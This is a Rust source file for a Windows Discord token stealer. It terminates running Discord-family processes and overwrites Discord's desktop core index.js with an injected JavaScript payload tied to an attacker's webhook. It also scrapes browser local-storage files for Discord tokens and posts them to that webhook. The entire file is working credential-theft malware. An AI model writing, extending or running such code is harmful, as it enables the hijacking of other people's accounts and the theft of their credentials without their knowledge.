use anyhow::{Context, Result};
use std::fs;
use std::path::{Path, PathBuf};
use std::collections::HashSet;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::Foundation::CloseHandle;

pub struct DiscordInjector {
    webhook_url: String,
}

impl DiscordInjector {
    pub fn new(webhook_url: String) -> Self {
        Self { webhook_url }
    }

    pub fn inject(&self) -> Result<()> {
        let paths = self.f_discord_paths()?;

        self.k_processes();

        for path in &paths {
            if let Err(e) = self.p_installation(path) {
                eprintln!("Failed to process Discord at {:?}: {}", path, e);
            }
        }

        if let Err(e) = self.i_browsers() {
            eprintln!("Failed to check browsers: {}", e);
        }

        Ok(())
    }

    fn k_processes(&self) {
        unsafe {
            let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
                Ok(h) => h,
                Err(_) => return,
            };

            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };

            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile);
                    let name = name.trim_matches('\0').to_lowercase();

                    if name.contains("discord") || name.contains("cord") || name.contains("vesktop") {
                         if let Ok(handle) = windows::Win32::System::Threading::OpenProcess(
                             windows::Win32::System::Threading::PROCESS_TERMINATE,
                             false,
                             entry.th32ProcessID
                         ) {
                             let _ = windows::Win32::System::Threading::TerminateProcess(handle, 0);
                             let _ = CloseHandle(handle);
                         }
                    }

                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snapshot);
        }
    }

    fn f_discord_paths(&self) -> Result<Vec<PathBuf>> {
        let mut paths = HashSet::new();
        let env_vars = ["LOCALAPPDATA", "APPDATA"];

        for env_var in env_vars {
            if let Ok(path_val) = std::env::var(env_var) {
                let base_path = PathBuf::from(path_val);
                if base_path.exists() {
                     if let Ok(entries) = fs::read_dir(base_path) {
                        for entry in entries.flatten() {
                            let path = entry.path();
                            if path.is_dir() {
                                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                                    let name_lower = name.to_lowercase();
                                    if name_lower.contains("cord") || name_lower.contains("vesktop") {
                                        paths.insert(path);
                                    }
                                }
                            }
                        }
                     }
                }
            }
        }

        Ok(paths.into_iter().collect())
    }

    fn p_installation(&self, install_path: &Path) -> Result<()> {
        for entry in fs::read_dir(install_path)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                    if name.starts_with("app-") {
                        self.p_app_folder(&path)?;
                    }
                }
            }
        }
        Ok(())
    }

    fn p_app_folder(&self, app_path: &Path) -> Result<()> {
        let modules_path = app_path.join("modules");
        if !modules_path.exists() {
            return Ok(())
        }

        for entry in fs::read_dir(modules_path)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                    if name.starts_with("discord_desktop_core-") {
                        let core_folder = path.join("discord_desktop_core");
                        let index_file = core_folder.join("index.js");

                        if index_file.exists() {
                            self.i_payload(&index_file)?;

                            let initiation_dir = core_folder.join("initiation");
                            if !initiation_dir.exists() {
                                let _ = fs::create_dir(&initiation_dir);
                            }
                        }
                    }
                }
            }
        }
        Ok(())
    }

    fn i_payload(&self, target_file: &Path) -> Result<()> {
        let raw_payload = include_str!("discord_payload.js");

        let payload = raw_payload.replace("%WEBHOOK%", &self.webhook_url);

        fs::write(target_file, payload).context("Failed to write injection payload")?;

        Ok(())
    }

    fn i_browsers(&self) -> Result<()> {
        use crate::injector::browser_discovery::BrowserDiscovery;
        use crate::injector::browser_discovery::g_user_data_dir;
        use regex_lite::Regex;

        let browsers = BrowserDiscovery::f_all();
        let mut tokens = HashSet::new();

        let token_regex = Regex::new(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}").unwrap();

        for browser in browsers {
             if let Some(user_data) = g_user_data_dir(&browser.browser_type) {
                 let profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"];

                 for profile in profiles {
                     let profile_path = user_data.join(profile);
                     let ls_path = profile_path.join("Local Storage").join("leveldb");

                     if ls_path.exists() {
                         if let Ok(entries) = fs::read_dir(ls_path) {
                             for entry in entries.flatten() {
                                 let path = entry.path();
                                 if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                                     if ext == "ldb" || ext == "log" {
                                         if let Ok(content) = fs::read_to_string(&path) {
                                            for cap in token_regex.find_iter(&content) {
                                                tokens.insert(cap.as_str().to_string());
                                            }
                                         }
                                         else if let Ok(bytes) = fs::read(&path) {
                                             let content = String::from_utf8_lossy(&bytes);
                                             for cap in token_regex.find_iter(&content) {
                                                 tokens.insert(cap.as_str().to_string());
                                             }
                                         }
                                     }
                                 }
                             }
                         }
                     }
                 }
             }
        }

        if !tokens.is_empty() {
            self.s_tokens_to_webhook(tokens)?;
        }

        Ok(())
    }

    fn s_tokens_to_webhook(&self, tokens: HashSet<String>) -> Result<()> {
        use serde_json::json;

        if tokens.is_empty() { return Ok(()); }

        let client = ureq::agent();

        let token_list: Vec<&String> = tokens.iter().collect();
        let content = format!("Found {} Discord tokens in browsers:\n```\n{}\n```", tokens.len(), token_list.into_iter().cloned().collect::<Vec<String>>().join("\n"));

        let payload = json!({
            "content": content,
            "username": "Kurion Browser Injector",
            "avatar_url": "https://avatars.githubusercontent.com/u/183814811?s=200&v=4"
        });

        let _ = client.post(&self.webhook_url)
            .send_json(payload);

        Ok(())
    }
}
